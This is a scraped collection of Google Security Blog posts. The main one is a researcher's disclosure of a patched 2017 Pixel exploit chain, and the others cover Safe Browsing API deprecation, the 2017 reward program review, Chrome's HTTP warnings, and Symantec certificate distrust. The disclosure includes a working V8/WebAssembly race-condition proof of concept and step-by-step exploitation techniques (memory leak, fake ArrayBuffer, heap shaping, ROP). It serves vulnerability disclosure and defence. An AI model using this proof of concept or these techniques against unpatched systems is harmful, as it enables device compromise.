effort.     .com { color: #32CD32; font-weight: bold; }                                      Posted by Mayank Jain and Scott Roberts, Android security team  [Cross-posted from the Android Developers Blog]  In June 2017, the Android security team increased the top payouts for the Android Security Rewards (ASR) program and worked with researchers to streamline the exploit submission process. In August 2017, Guang Gong (@oldfresher) of Alpha Team, Qihoo 360 Technology Co. Ltd. submitted the first working remote exploit chain since the ASR program's expansion. For his detailed report, Gong was awarded $105,000, which is the highest reward in the history of the ASR program and $7500 by Chrome Rewards program for a total of $112,500. The complete set of issues was resolved as part of the December 2017 monthly security update. Devices with the security patch level of 2017-12-05 or later are protected from these issues.    All Pixel devices or partner devices using A/B (seamless) system updates will automatically install these updates; users must restart their devices to complete the installation.  The Android Security team would like to thank Guang Gong and the researcher community for their contributions to Android security. If you'd like to participate in Android Security Rewards program, check out our Program rules. For tips on how to submit reports, see Bug Hunter University.  The following article is a guest blog post authored by Guang Gong of Alpha team, Qihoo 360 Technology Ltd.   Technical details of a Pixel remote exploit chain The Pixel phone is protected by many layers of security. It was the only device that was not pwned in the 2017 Mobile Pwn2Own competition. But in August 2017, my team discovered a remote exploit chain—the first of its kind since the ASR program expansion. Thanks to the Android security team for their responsiveness and help during the submission process.  This blog post covers the technical details of the exploit chain. The exploit chain includes two bugs, CVE-2017-5116 and CVE-2017-14904. CVE-2017-5116 is a V8 engine bug that is used to get remote code execution in sandboxed Chrome render process.  CVE-2017-14904 is a bug in Android's libgralloc module that is used to escape from Chrome's sandbox. Together, this exploit chain can be used to inject arbitrary code into system_server by accessing a malicious URL in Chrome. To reproduce the exploit, an example vulnerable environment is Chrome 60.3112.107 + Android 7.1.2  (Security patch level 2017-8-05) (google/sailfish/sailfish:7.1.2/NJH47F/4146041:user/release-keys).    The RCE bug (CVE-2017-5116) New features usually bring new bugs. V8 6.0 introduces support for SharedArrayBuffer, a low-level mechanism to share memory between JavaScript workers and synchronize control flow across workers. SharedArrayBuffers give JavaScript access to shared memory, atomics, and futexes. WebAssembly is a new type of code that can be run in modern web browsers— it is a low-level assembly-like language with a compact binary format that runs with near-native performance and provides languages, such as C/C++, with a compilation target so that they can run on the web. By combining the three features, SharedArrayBuffer WebAssembly, and web worker in Chrome, an OOB access can be triggered through a race condition. Simply speaking, WebAssembly code can be put into a SharedArrayBuffer and then transferred to a web worker. When the main thread parses the WebAssembly code, the worker thread can modify the code at the same time, which causes an OOB access.   The buggy code is in the function GetFirstArgumentAsBytes where the argument args may be an ArrayBuffer or TypedArray object. After SharedArrayBuffer is imported to JavaScript, a TypedArray may be backed by a SharedArraybuffer, so the content of the TypedArray may be modified by other worker threads at any time.  i::wasm::ModuleWireBytes GetFirstArgumentAsBytes(     const v8::FunctionCallbackInfo & args, ErrorThrower* thrower) {   ......   } else if (source->IsTypedArray()) {    //--->source should be checked if it's backed by a SharedArrayBuffer     // A TypedArray was passed.     Local  array = Local ::Cast(source);     Local  buffer = array->Buffer();     ArrayBuffer::Contents contents = buffer->GetContents();     start =         reinterpret_cast (contents.Data()) + array->ByteOffset();     length = array->ByteLength();   }    ......   return i::wasm::ModuleWireBytes(start, start + length); }  A simple PoC is as follows:     poc    worker:{        self.onmessage = function(arg) {         console.log(\"worker started\");         var ta = new Uint8Array(arg.data);         var i =0;         while(1){             if(i==0){                 i=1;                 ta[51]=0;   //--->4)modify the webassembly code at the same time             }else{                 i=0;                 ta[51]=128;             }         }     } }     function getSharedTypedArray(){     var wasmarr = [         0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,         0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03,         0x03, 0x02, 0x00, 0x00, 0x07, 0x12, 0x01, 0x0e,         0x67, 0x65, 0x74, 0x41, 0x6e, 0x73, 0x77, 0x65,         0x72, 0x50, 0x6c, 0x75, 0x73, 0x31, 0x00, 0x01,         0x0a, 0x0e, 0x02, 0x04, 0x00, 0x41, 0x2a, 0x0b,         0x07, 0x00, 0x10, 0x00, 0x41, 0x01, 0x6a, 0x0b];     var sb = new SharedArrayBuffer(wasmarr.length);           //---> 1)put WebAssembly code in a SharedArrayBuffer     var sta = new Uint8Array(sb);     for(var i=0;i<sta.length;i++)         sta[i]=wasmarr[i];     return sta;     } var blob = new Blob([         document.querySelector('#worker1').textContent         ], { type: \"text/javascript\" }) var worker = new Worker(window.URL.createObjectURL(blob));   //---> 2)create a web worker var sta = getSharedTypedArray(); worker.postMessage(sta.buffer);                              //--->3)pass the WebAssembly code to the web worker setTimeout(function(){         while(1){         try{         sta[51]=0;         var myModule = new WebAssembly.Module(sta);          //--->4)parse the WebAssembly code         var myInstance = new WebAssembly.Instance(myModule);         //myInstance.exports.getAnswerPlus1();         }catch(e){         }         }     },1000); //worker.terminate();       The text format of the WebAssembly code is as follows:  00002b func[0]: 00002d: 41 2a                      | i32.const 42 00002f: 0b                         | end 000030 func[1]: 000032: 10 00                      | call 0 000034: 41 01                      | i32.const 1 000036: 6a                         | i32.add 000037: 0b                         | end  First, the above binary format WebAssembly code is put into a SharedArrayBuffer, then a TypedArray Object is created, using the SharedArrayBuffer as buffer. After that, a worker thread is created and the SharedArrayBuffer is passed to the newly created worker thread. While the main thread is parsing the WebAssembly Code, the worker thread modifies the SharedArrayBuffer at the same time. Under this circumstance, a race condition causes a TOCTOU issue. After the main thread's bound check, the instruction \" call 0\" can be modified by the worker thread to \"call 128\" and then be parsed and compiled by the main thread, so an OOB access occurs.  Because the \"call 0\" Web Assembly instruction can be modified  to call any other Web Assembly functions, the exploitation of this bug is straightforward. If \"call 0\" is modified to \"call $leak\", registers and stack contents are dumped to Web Assembly memory. Because function 0 and function $leak have a different number of arguments, this results in many useful pieces of data in the stack being leaked.   (func $leak(param i32 i32 i32 i32 i32 i32)(result i32)     i32.const 0     get_local 0     i32.store     i32.const 4     get_local 1     i32.store     i32.const 8     get_local 2     i32.store     i32.const 12     get_local 3     i32.store     i32.const 16     get_local 4     i32.store     i32.const 20     get_local 5     i32.store     i32.const 0   ))  Not only the instruction \"call 0\" can be modified, any \"call funcx\" instruction can be modified. Assume funcx is a wasm function with 6 arguments as follows, when v8 compiles funcx in ia32 architecture, the first 5 arguments are passed through the registers and the sixth argument is passed through stack. All the arguments can be set to any value by JavaScript:  /*Text format of funcx*/  (func $simple6 (param i32 i32 i32 i32 i32 i32 ) (result i32)     get_local 5     get_local 4     i32.add) /*Disassembly code of funcx*/ --- Code --- kind = WASM_FUNCTION name = wasm#1 compiler = turbofan Instructions (size = 20) 0x58f87600     0  8b442404       mov eax,[esp+0x4] 0x58f87604     4  03c6           add eax,esi 0x58f87606     6  c20400         ret 0x4 0x58f87609     9  0f1f00         nop Safepoints (size = 8) RelocInfo (size = 0) --- End code ---  When a JavaScript function calls a WebAssembly function, v8 compiler creates a JS_TO_WASM function internally, after compilation, the JavaScript function will call the created JS_TO_WASM function and then the created JS_TO_WASM function will call the WebAssembly function. JS_TO_WASM functions use different call convention, its first arguments is passed through stack. If \"call funcx\" is modified to call the following JS_TO_WASM function.  /*Disassembly code of JS_TO_WASM function */ --- Code --- kind = JS_TO_WASM_FUNCTION name = js-to-wasm#0 compiler = turbofan Instructions (size = 170) 0x4be08f20     0  55             push ebp 0x4be08f21     1  89e5           mov ebp,esp 0x4be08f23     3  56             push esi 0x4be08f24     4  57             push edi 0x4be08f25     5  83ec08         sub esp,0x8 0x4be08f28     8  8b4508         mov eax,[ebp+0x8] 0x4be08f2b     b  e8702e2bde     call 0x2a0bbda0  (ToNumber)    ;; code: BUILTIN 0x4be08f30    10  a801           test al,0x1 0x4be08f32    12  0f852a000000   jnz 0x4be08f62     The JS_TO_WASM function will take the sixth arguments of funcx as its first argument, but it takes its first argument as an object pointer, so type confusion will be triggered when the argument is passed to the ToNumber function, which means we can pass any values as an object pointer to the ToNumber function. So we can fake an ArrayBuffer object in some address such as in a double array and pass the address to ToNumber.  The layout of an ArrayBuffer is as follows:  /* ArrayBuffer layouts 40 Bytes*/                                                                                                                          Map                                                                                                                                                        Properties                                                                                                                                                 Elements                                                                                                                                                   ByteLength                                                                                                                                                 BackingStore                                                                                                                                               AllocationBase                                                                                                                                             AllocationLength                                                                                                                                           Fields                                                                                                                                                     internal                                                                                                                                                   internal                                                                                                                                                                                                                                                                                                       /* Map layouts 44 Bytes*/                                                                                                                                    static kMapOffset = 0,                                                                                                                                     static kInstanceSizesOffset = 4,                                                                                                                           static kInstanceAttributesOffset = 8,                                                                                                                      static kBitField3Offset = 12,                                                                                                                              static kPrototypeOffset = 16,                                                                                                                              static kConstructorOrBackPointerOffset = 20,                                                                                                               static kTransitionsOrPrototypeInfoOffset = 24,                                                                                                             static kDescriptorsOffset = 28,                                                                                                                            static kLayoutDescriptorOffset = 1,                                                                                                                        static kCodeCacheOffset = 32,                                                                                                                              static kDependentCodeOffset = 36,                                                                                                                          static kWeakCellCacheOffset = 40,                                                                                                                          static kPointerFieldsBeginOffset = 16,                                                                                                                     static kPointerFieldsEndOffset = 44,                                                                                                                       static kInstanceSizeOffset = 4,                                                                                                                            static kInObjectPropertiesOrConstructorFunctionIndexOffset = 5,                                                                                            static kUnusedOffset = 6,                                                                                                                                  static kVisitorIdOffset = 7,                                                                                                                               static kInstanceTypeOffset = 8,     //one byte                                                                                                             static kBitFieldOffset = 9,                                                                                                                                static kInstanceTypeAndBitFieldOffset = 8,                                                                                                                 static kBitField2Offset = 10,                                                                                                                              static kUnusedPropertyFieldsOffset = 11  Because the content of the stack can be leaked, we can get many useful data to fake the ArrayBuffer. For example, we can leak the start address of an object, and calculate the start address of its elements, which is a FixedArray object. We can use this FixedArray object as the faked ArrayBuffer's properties and elements fields. We have to fake the map of the ArrayBuffer too, luckily, most of the fields of the map are not used when the bug is triggered. But the InstanceType in offset 8 has to be set to 0xc3(this value depends on the version of v8) to indicate this object is an ArrayBuffer.  In order to get a reference of the faked ArrayBuffer in JavaScript, we have to set the Prototype field of Map in offset 16 to an object whose Symbol.toPrimitive property is a JavaScript call back function. When the faked array buffer is passed to the ToNumber function, to convert the ArrayBuffer object to a Number, the call back function will be called, so we can get a reference of the faked ArrayBuffer in the call back function. Because the ArrayBuffer is faked in a double array, the content of the array can be set to any value, so we can change the field BackingStore and ByteLength of the faked array buffer to get arbitrary memory read and write. With arbitrary memory read/write, executing shellcode is simple. As JIT Code in Chrome is readable, writable and executable, we can overwrite it to execute shellcode.  Chrome team fixed this bug very quickly in chrome 61.0.3163.79, just a week after I submitted the exploit.    The EoP Bug (CVE-2017-14904) The sandbox escape bug is caused by map and unmap mismatch, which causes a Use-After-Unmap issue. The buggy code is in the functions gralloc_map and gralloc_unmap:  static int gralloc_map(gralloc_module_t const* module,                        buffer_handle_t handle) { ……     private_handle_t* hnd = (private_handle_t*)handle;     ……     if (!(hnd->flags & private_handle_t::PRIV_FLAGS_FRAMEBUFFER) &&         !(hnd->flags & private_handle_t::PRIV_FLAGS_SECURE_BUFFER)) {         size = hnd->size;         err = memalloc->map_buffer(&mappedAddress, size,                                        hnd->offset, hnd->fd);        //---> mapped an ashmem and get the mapped address. the ashmem fd and offset can be controlled by Chrome render process.         if(err || mappedAddress == MAP_FAILED) {             ALOGE(\"Could not mmap handle %p, fd=%d (%s)\",                   handle, hnd->fd, strerror(errno));             return -errno;         }         hnd->base = uint64_t(mappedAddress) + hnd->offset;          //---> save mappedAddress+offset to hnd->base     } else {         err = -EACCES; } ……     return err; }  gralloc_map maps a graphic buffer controlled by the arguments handle to memory space and gralloc_unmap unmaps it. While mapping, the mappedAddress plus hnd->offset is stored to hnd->base, but while unmapping, hnd->base is passed to system call unmap directly minus the offset. hnd->offset can be manipulated from a Chrome's sandboxed process, so it's possible to unmap any pages in system_server from Chrome's sandboxed render process.  static int gralloc_unmap(gralloc_module_t const* module,                          buffer_handle_t handle) {   ……     if(hnd->base) {         err = memalloc->unmap_buffer((void*)hnd->base, hnd->size, hnd->offset);    //---> while unmapping, hnd->offset is not used, hnd->base is used as the base address, map and unmap are mismatched.         if (err) {             ALOGE(\"Could not unmap memory at address %p, %s\", (void*) hnd->base,                     strerror(errno));             return -errno;         }         hnd->base = 0; } ……     return 0; } int IonAlloc::unmap_buffer(void *base, unsigned int size,         unsigned int /*offset*/)                               //---> look, offset is not used by unmap_buffer {     int err = 0;     if(munmap(base, size)) {         err = -errno;         ALOGE(\"ion: Failed to unmap memory at %p : %s\",               base, strerror(errno));     }     return err; }  Although SeLinux restricts the domain isolated_app to access most of Android system service, isolated_app can still access three Android system services.  52neverallow isolated_app { 53    service_manager_type 54    -activity_service 55    -display_service 56    -webviewupdate_service 57}:service_manager find;  To trigger the aforementioned Use-After-Unmap bug from Chrome's sandbox, first put a GraphicBuffer object, which is parseable into a bundle, and then call the binder method convertToTranslucent of IActivityManager to pass the malicious bundle to system_server. When system_server handles this malicious bundle, the bug is triggered.   This EoP bug targets the same attack surface as the bug in our 2016 MoSec presentation, A Way of Breaking Chrome's Sandbox in Android. It is also similar to Bitunmap, except  exploiting it from a sandboxed Chrome render process is more difficult than from an app.   To exploit this EoP bug:  1. Address space shaping. Make the address space layout look as follows, a heap chunk is right above some continuous ashmem mapping:  7f54600000-7f54800000 rw-p 00000000 00:00 0           [anon:libc_malloc] 7f58000000-7f54a00000 rw-s 001fe000 00:04 32783         /dev/ashmem/360alpha29 (deleted) 7f54a00000-7f54c00000 rw-s 00000000 00:04 32781         /dev/ashmem/360alpha28 (deleted) 7f54c00000-7f54e00000 rw-s 00000000 00:04 32779         /dev/ashmem/360alpha27 (deleted) 7f54e00000-7f55000000 rw-s 00000000 00:04 32777         /dev/ashmem/360alpha26 (deleted) 7f55000000-7f55200000 rw-s 00000000 00:04 32775         /dev/ashmem/360alpha25 (deleted) ......  2. Unmap part of the heap (1 KB) and part of an ashmem memory (2MB–1KB) by triggering the bug:   7f54400000-7f54600000 rw-s 00000000 00:04 31603         /dev/ashmem/360alpha1000 (deleted) 7f54600000-7f547ff000 rw-p 00000000 00:00 0           [anon:libc_malloc] //--->There is a 2MB memory gap 7f549ff000-7f54a00000 rw-s 001fe000 00:04 32783        /dev/ashmem/360alpha29 (deleted) 7f54a00000-7f54c00000 rw-s 00000000 00:04 32781        /dev/ashmem/360alpha28 (deleted) 7f54c00000-7f54e00000 rw-s 00000000 00:04 32779        /dev/ashmem/360alpha27 (deleted) 7f54e00000-7f55000000 rw-s 00000000 00:04 32777        /dev/ashmem/360alpha26 (deleted) 7f55000000-7f55200000 rw-s 00000000 00:04 32775        /dev/ashmem/360alpha25 (deleted)  3. Fill the unmapped space with an ashmem memory:  7f54400000-7f54600000 rw-s 00000000 00:04 31603      /dev/ashmem/360alpha1000 (deleted) 7f54600000-7f547ff000 rw-p 00000000 00:00 0         [anon:libc_malloc] 7f547ff000-7f549ff000 rw-s 00000000 00:04 31605       /dev/ashmem/360alpha1001 (deleted)   //--->The gap is filled with the ashmem memory 360alpha1001 7f549ff000-7f54a00000 rw-s 001fe000 00:04 32783      /dev/ashmem/360alpha29 (deleted) 7f54a00000-7f54c00000 rw-s 00000000 00:04 32781      /dev/ashmem/360alpha28 (deleted) 7f54c00000-7f54e00000 rw-s 00000000 00:04 32779      /dev/ashmem/360alpha27 (deleted) 7f54e00000-7f55000000 rw-s 00000000 00:04 32777      /dev/ashmem/360alpha26 (deleted) 7f55000000-7f55200000 rw-s 00000000 00:04 32775      /dev/ashmem/360alpha25 (deleted)  4. Spray the heap and the heap data will be written to the ashmem memory:  7f54400000-7f54600000 rw-s 00000000 00:04 31603        /dev/ashmem/360alpha1000 (deleted) 7f54600000-7f547ff000 rw-p 00000000 00:00 0           [anon:libc_malloc] 7f547ff000-7f549ff000 rw-s 00000000 00:04 31605          /dev/ashmem/360alpha1001 (deleted) //--->the heap manager believes the memory range from 0x7f547ff000 to 0x7f54800000 is still mongered by it and will allocate memory from this range, result in heap data is written to ashmem memory 7f549ff000-7f54a00000 rw-s 001fe000 00:04 32783        /dev/ashmem/360alpha29 (deleted) 7f54a00000-7f54c00000 rw-s 00000000 00:04 32781        /dev/ashmem/360alpha28 (deleted) 7f54c00000-7f54e00000 rw-s 00000000 00:04 32779        /dev/ashmem/360alpha27 (deleted) 7f54e00000-7f55000000 rw-s 00000000 00:04 32777        /dev/ashmem/360alpha26 (deleted) 7f55000000-7f55200000 rw-s 00000000 00:04 32775        /dev/ashmem/360alpha25 (deleted)  5. Because the filled ashmem in step 3 is mapped both by system_server and render process, part of the heap of system_server can be read and written by render process and we can trigger system_server to allocate some GraphicBuffer object in ashmem. As GraphicBuffer is inherited from ANativeWindowBuffer, which has a member named common whose type is android_native_base_t, we can read two function points (incRef and decRef) from ashmem memory and then can calculate the base address of the module libui. In the latest Pixel device, Chrome's render process is still 32-bit process but system_server is 64-bit process. So we have to leak some module's base address for ROP. Now that we have the base address of libui, the last step is  to trigger ROP. Unluckily, it seems that the points incRef and decRef haven't been used. It's impossible to modify it to jump to ROP, but we can modify the virtual table of GraphicBuffer to trigger ROP.  typedef struct android_native_base_t {     /* a magic value defined by the actual EGL native type */     int magic;     /* the sizeof() of the actual EGL native type */     int version;     void* reserved[4];     /* reference-counting interface */     void (*incRef)(struct android_native_base_t* base);     void (*decRef)(struct android_native_base_t* base); } android_native_base_t;  6.Trigger a GC to execute ROP  When a GraphicBuffer object is deconstructed, the virtual function onLastStrongRef is called, so we can replace this virtual function to jump to ROP. When GC happens, the control flow goes to ROP. Finding an ROP chain in limited module(libui) is challenging, but after hard work, we successfully found one and dumped the contents of the file into /data/misc/wifi/wpa_supplicant.conf .   Summary The Android security team responded quickly to our report and included the fix for these two bugs in the December 2017 Security Update. Supported Google device and devices with the security patch level of 2017-12-05 or later address these issues. While parsing untrusted parcels still happens in sensitive locations, the Android security team is working on hardening the platform to mitigate against similar vulnerabilities.    The EoP bug was discovered thanks to a joint effort between 360 Alpha Team and 360 C0RE Team. Thanks very much for their effort.   .com { color: #32CD32; font-weight: bold; }      ", "date": "January 17, 2018"},
{"website": "Google-Security", "title": "\nAnnouncing turndown of the deprecated Google Safe Browsing APIs\n", "author": ["Posted by Alex Wozniak, Software Engineer, Safe Browsing Team"], "link": "https://security.googleblog.com/2018/01/announcing-turndown-of-deprecated.html", "abstract": "                             Posted by Alex Wozniak, Software Engineer, Safe Browsing Team   In May 2016, we  introduced  the latest version of the  Google Safe Browsing API (v4) . Since this launch, thousands of developers around the world have adopted the API to protect over  3 billion devices  from unsafe web resources.    Coupled with that announcement was the deprecation of legacy Safe Browsing APIs, v2 and v3. Today we are announcing an official turn-down date of October 1st, 2018, for these APIs. All v2 and v3 clients must transition to the v4 API prior to this date.    To make the switch easier, an open source implementation of the Update API (v4) is available on  GitHub . Android developers always get the latest version of Safe Browsing&#8217;s data and protocols via the  SafetyNet Safe Browsing API .  Getting started  is simple; all you need is a Google Account, Google Developer Console project, and an API key.    For questions or feedback, join the discussion with other developers on the  Safe Browsing Google Group . Visit  our website  for the latest information on Safe Browsing.                                   Posted by Alex Wozniak, Software Engineer, Safe Browsing Team In May 2016, we introduced the latest version of the Google Safe Browsing API (v4). Since this launch, thousands of developers around the world have adopted the API to protect over 3 billion devices from unsafe web resources.  Coupled with that announcement was the deprecation of legacy Safe Browsing APIs, v2 and v3. Today we are announcing an official turn-down date of October 1st, 2018, for these APIs. All v2 and v3 clients must transition to the v4 API prior to this date.  To make the switch easier, an open source implementation of the Update API (v4) is available on GitHub. Android developers always get the latest version of Safe Browsing’s data and protocols via the SafetyNet Safe Browsing API. Getting started is simple; all you need is a Google Account, Google Developer Console project, and an API key.  For questions or feedback, join the discussion with other developers on the Safe Browsing Google Group. Visit our website for the latest information on Safe Browsing.     ", "date": "January 24, 2018"},
{"website": "Google-Security", "title": "\nVulnerability Reward Program: 2017 Year in Review\n", "author": ["Posted by Jan Keller, Google VRP Technical Pwning Master"], "link": "https://security.googleblog.com/2018/02/vulnerability-reward-program-2017-year.html", "abstract": "                             Posted by Jan Keller, Google VRP Technical Pwning Master   As we kick-off a new year, we wanted to take a moment to look back at the Vulnerability Reward Program in 2017. It joins our past retrospectives for  2014 ,  2015 , and  2016 , and shows the course our VRPs have taken.    At the heart of this blog post is a big thank you to the security research community. You continue to help make Google&#8217;s users and our products more secure. We looking forward to continuing our collaboration with the community in 2018 and beyond!     2017, By the Numbers     Here&#8217;s an overview of how we rewarded researchers for their reports to us in 2017:         We awarded researchers more than 1 million dollars for vulnerabilities they found and reported in Google products, and a similar amount for Android as well. Combined with our Chrome awards, we awarded nearly 3 million dollars to researchers for their reports last year, overall.    Drilling-down a bit further, we awarded $125,000 to more than 50 security researchers from all around the world through our  Vulnerability Research Grants Program , and $50,000 to the hard-working folks who improve the security of open-source software as part of our  Patch Rewards Program .     A few bug highlights       Every year, a few bug reports stand out: the research may have been especially clever, the vulnerability may have been especially serious, or the report may have been especially fun and quirky!    Here are a few of our favorites from 2017:       In August, researcher Guang Gong  outlined  an exploit chain on Pixel phones which combined a remote code execution bug in the sandboxed Chrome render process with a subsequent sandbox escape through Android&#8217;s libgralloc. As part of the  Android Security Rewards Program  he received the largest reward of the year: $112,500. The Pixel was the only device that wasn&#8217;t exploited during last year&#8217;s annual Mobile pwn2own competition, and Guang&#8217;s report helped strengthen its protections even further.   Researcher \"gzobqq\" received the $100,000  pwnium  award for a  chain of bugs  across five components that achieved remote code execution in Chrome OS guest mode.   Alex Birsan discovered that anyone could have gained access to internal  Google Issue Tracker  data. He detailed his research  here , and we awarded him $15,600 for his efforts.              Making Android and Play even safer            Over the course of the year, we continued to develop our Android and Play Security Reward programs.         No one had claimed the top reward for an Android exploit chain in more than two years, so we  announced  that the greatest reward for a remote exploit chain--or exploit leading to TrustZone or Verified Boot compromise--would increase from $50,000 to $200,000. We also increased the top-end reward for a remote kernel exploit from $30,000 to $150,000.              In October, we introduced the by-invitation-only  Google Play Security Reward Program  to encourage security research into popular Android apps available on Google Play.              Today, we&#8217;re expanding the range of rewards for remote code executions from $1,000 to $5,000. We&#8217;re also introducing a new category that includes vulnerabilities that could result in the theft of users&#8217; private data, information being transferred unencrypted, or bugs that result in access to protected app components. We&#8217;ll award $1,000 for these bugs. For more information visit the Google Play Security Reward Program  site .              And finally, we want to give a shout out to the researchers who&#8217;ve submitted fuzzers to the  Chrome Fuzzer Program : they get rewards for every eligible bug their fuzzers find without having to do any more work, or even filing a bug.              Given how well things have been going these past years, we look forward to our Vulnerability Rewards Programs resulting in even more user protection in 2018 thanks to the hard work of the security research community.          * Andrew Whalley ( Chrome VRP ), Mayank Jain ( Android Security Rewards ), and Renu Chaudhary ( Google Play VRP ) contributed mightily to help lead these Google-wide efforts.                                      Posted by Jan Keller, Google VRP Technical Pwning Master As we kick-off a new year, we wanted to take a moment to look back at the Vulnerability Reward Program in 2017. It joins our past retrospectives for 2014, 2015, and 2016, and shows the course our VRPs have taken.  At the heart of this blog post is a big thank you to the security research community. You continue to help make Google’s users and our products more secure. We looking forward to continuing our collaboration with the community in 2018 and beyond!  2017, By the Numbers  Here’s an overview of how we rewarded researchers for their reports to us in 2017:   We awarded researchers more than 1 million dollars for vulnerabilities they found and reported in Google products, and a similar amount for Android as well. Combined with our Chrome awards, we awarded nearly 3 million dollars to researchers for their reports last year, overall.  Drilling-down a bit further, we awarded $125,000 to more than 50 security researchers from all around the world through our Vulnerability Research Grants Program, and $50,000 to the hard-working folks who improve the security of open-source software as part of our Patch Rewards Program.  A few bug highlights  Every year, a few bug reports stand out: the research may have been especially clever, the vulnerability may have been especially serious, or the report may have been especially fun and quirky!  Here are a few of our favorites from 2017:   In August, researcher Guang Gong outlined an exploit chain on Pixel phones which combined a remote code execution bug in the sandboxed Chrome render process with a subsequent sandbox escape through Android’s libgralloc. As part of the Android Security Rewards Program he received the largest reward of the year: $112,500. The Pixel was the only device that wasn’t exploited during last year’s annual Mobile pwn2own competition, and Guang’s report helped strengthen its protections even further. Researcher \"gzobqq\" received the $100,000 pwnium award for a chain of bugs across five components that achieved remote code execution in Chrome OS guest mode. Alex Birsan discovered that anyone could have gained access to internal Google Issue Tracker data. He detailed his research here, and we awarded him $15,600 for his efforts.     Making Android and Play even safer    Over the course of the year, we continued to develop our Android and Play Security Reward programs.    No one had claimed the top reward for an Android exploit chain in more than two years, so we announced that the greatest reward for a remote exploit chain--or exploit leading to TrustZone or Verified Boot compromise--would increase from $50,000 to $200,000. We also increased the top-end reward for a remote kernel exploit from $30,000 to $150,000.      In October, we introduced the by-invitation-only Google Play Security Reward Program to encourage security research into popular Android apps available on Google Play.      Today, we’re expanding the range of rewards for remote code executions from $1,000 to $5,000. We’re also introducing a new category that includes vulnerabilities that could result in the theft of users’ private data, information being transferred unencrypted, or bugs that result in access to protected app components. We’ll award $1,000 for these bugs. For more information visit the Google Play Security Reward Program site.      And finally, we want to give a shout out to the researchers who’ve submitted fuzzers to the Chrome Fuzzer Program: they get rewards for every eligible bug their fuzzers find without having to do any more work, or even filing a bug.      Given how well things have been going these past years, we look forward to our Vulnerability Rewards Programs resulting in even more user protection in 2018 thanks to the hard work of the security research community.    * Andrew Whalley (Chrome VRP), Mayank Jain (Android Security Rewards), and Renu Chaudhary (Google Play VRP) contributed mightily to help lead these Google-wide efforts.     ", "date": "February 7, 2018"},
{"website": "Google-Security", "title": "\nA secure web is here to stay\n", "author": ["Posted by Emily Schechter, Chrome Security Product Manager"], "link": "https://security.googleblog.com/2018/02/a-secure-web-is-here-to-stay.html", "abstract": "                             Posted by Emily Schechter, Chrome Security Product Manager   For the past several years, we&#8217;ve moved toward a more secure web by strongly advocating that sites adopt HTTPS encryption. And within the last year, we&#8217;ve also helped users understand that HTTP sites are not secure by  gradually   marking  a larger subset of HTTP pages as &#8220;not secure&#8221;. Beginning in July 2018 with the release of Chrome 68, Chrome will mark all HTTP sites as &#8220;not secure&#8221;.                  In Chrome 68, the omnibox will display &#8220;Not secure&#8221; for all HTTP pages.       Developers have been transitioning their sites to HTTPS and making the web safer for everyone.  Progress last year  was incredible, and it&#8217;s continued since then:       Over 68% of Chrome traffic on both Android and Windows is now protected   Over 78% of Chrome traffic on both Chrome OS and Mac is now protected   81 of the top 100 sites on the web use HTTPS by default    Chrome is dedicated to making it as easy as possible to set up HTTPS. Mixed content audits are  now available  to help developers migrate their sites to HTTPS in the  latest Node CLI  version of  Lighthouse , an automated tool for improving web pages. The new audit in Lighthouse helps developers find which resources a site loads using HTTP, and which of those are ready to be upgraded to HTTPS simply by changing the subresource reference to the HTTPS version.              Lighthouse is an automated developer tool for improving web pages.     Chrome&#8217;s new interface will help users understand that all HTTP sites are not secure, and continue to move the web towards a secure HTTPS web by default. HTTPS is  easier and cheaper  than ever before, and it unlocks both performance improvements and powerful new features that are too sensitive for HTTP. Developers, check out our  set-up guides  to get started.                                      Posted by Emily Schechter, Chrome Security Product Manager For the past several years, we’ve moved toward a more secure web by strongly advocating that sites adopt HTTPS encryption. And within the last year, we’ve also helped users understand that HTTP sites are not secure by gradually marking a larger subset of HTTP pages as “not secure”. Beginning in July 2018 with the release of Chrome 68, Chrome will mark all HTTP sites as “not secure”.       In Chrome 68, the omnibox will display “Not secure” for all HTTP pages.   Developers have been transitioning their sites to HTTPS and making the web safer for everyone. Progress last year was incredible, and it’s continued since then:   Over 68% of Chrome traffic on both Android and Windows is now protected Over 78% of Chrome traffic on both Chrome OS and Mac is now protected 81 of the top 100 sites on the web use HTTPS by default  Chrome is dedicated to making it as easy as possible to set up HTTPS. Mixed content audits are now available to help developers migrate their sites to HTTPS in the latest Node CLI version of Lighthouse, an automated tool for improving web pages. The new audit in Lighthouse helps developers find which resources a site loads using HTTP, and which of those are ready to be upgraded to HTTPS simply by changing the subresource reference to the HTTPS version.     Lighthouse is an automated developer tool for improving web pages.  Chrome’s new interface will help users understand that all HTTP sites are not secure, and continue to move the web towards a secure HTTPS web by default. HTTPS is easier and cheaper than ever before, and it unlocks both performance improvements and powerful new features that are too sensitive for HTTP. Developers, check out our set-up guides to get started.      ", "date": "February 8, 2018"},
{"website": "Google-Security", "title": "\nDistrust of the Symantec PKI: Immediate action needed by site operators\n", "author": ["Posted by Devon O’Brien, Ryan Sleevi, Emily Stark, Chrome security team"], "link": "https://security.googleblog.com/2018/03/distrust-of-symantec-pki-immediate.html", "abstract": "                             Posted by Devon O&#8217;Brien, Ryan Sleevi, Emily Stark, Chrome security team       Update October 17, 2018 :&nbsp;  Chrome 70  has now been released  to the Stable Channel, and users will start to see full screen interstitials on sites which still use certificates issues by the Legacy Symantec PKI. Initially this change will reach a small percentage of users, and then slowly scale up to 100% over the next several weeks.        Site Operators receiving problem reports from users are strongly encouraged to take corrective action by replacing their website certificates as soon as possible. Instructions on how to determine whether your site is affected as well as what corrective action is needed can be found below.       We  previously announced  plans to deprecate Chrome&#8217;s trust in the Symantec certificate authority (including Symantec-owned brands like Thawte, VeriSign, Equifax, GeoTrust, and RapidSSL). This post outlines how site operators can determine if they&#8217;re affected by this deprecation, and if so, what needs to be done and by when. Failure to replace these certificates will result in site breakage in upcoming versions of major browsers, including Chrome.       Chrome 66       If your site is using a SSL/TLS certificate from Symantec that was issued before June 1, 2016, it will stop functioning in Chrome 66, which could already be impacting your users.  If you are uncertain about whether your site is using such a certificate, you can preview these changes in  Chrome Canary  to see if your site is affected. If connecting to your site displays a certificate error or a warning in DevTools as shown below, you&#8217;ll need to replace your certificate. You can get a new certificate from any  trusted CA , including Digicert, which recently acquired Symantec&#8217;s CA business.               An example of a certificate error that Chrome 66 users might see if you are using a Legacy Symantec SSL/TLS certificate that was issued before June 1, 2016.&nbsp;                                        The DevTools message you will see if you need to replace your certificate before Chrome 66.            Chrome 66 has already been released to the Canary and Dev channels, meaning affected sites are already impacting users of these Chrome channels. If affected sites do not replace their certificates by  March 15, 2018 , Chrome Beta users will begin experiencing the failures as well. 